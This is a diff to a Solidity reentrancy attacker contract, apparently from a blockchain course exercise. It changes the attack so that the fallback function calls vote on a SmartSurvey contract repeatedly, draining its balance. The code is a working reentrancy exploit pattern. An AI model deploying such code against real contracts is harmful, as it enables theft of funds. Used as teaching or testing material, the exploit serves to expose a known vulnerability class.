@@ -3,7 +3,7 @@ pragma solidity ^0.8.24;
 
 import {SmartSurvey} from "../src/SurveyContract.sol"; //import game contract
 
-contract reentrancyAttacker {
+contract reentrancyAttacker2 {
     SmartSurvey public smartSurvey;
     string public surveyName;
 
@@ -20,11 +20,11 @@ contract reentrancyAttacker {
         string[] memory options = new string[](2); 
         options[0] = "no";
         options[1] = "yes";
-        smartSurvey.create_survey{value: 100 ether}("BlockChainClass", "Should I take our course in blockchain?", options, 1000, 2,1111);
+        smartSurvey.create_survey{value: 100 ether}("BlockChainClass", "Should I take our course in blockchain?", options, 1000, 2, 1111);
         smartSurvey.vote("BlockChainClass", 0);
 
         //end it
-        smartSurvey.endNow(surveyName);
+        smartSurvey.vote(surveyName, 1);
         //return address(this).balance;
        
 
@@ -32,7 +32,7 @@ contract reentrancyAttacker {
     //fallback function tries to keep collecting reward from the bank
     fallback() external payable {
         if (address(smartSurvey).balance >= 1 ether) {
-            smartSurvey.endNow(surveyName);
+            smartSurvey.vote(surveyName, 1);
         }
     }
 }
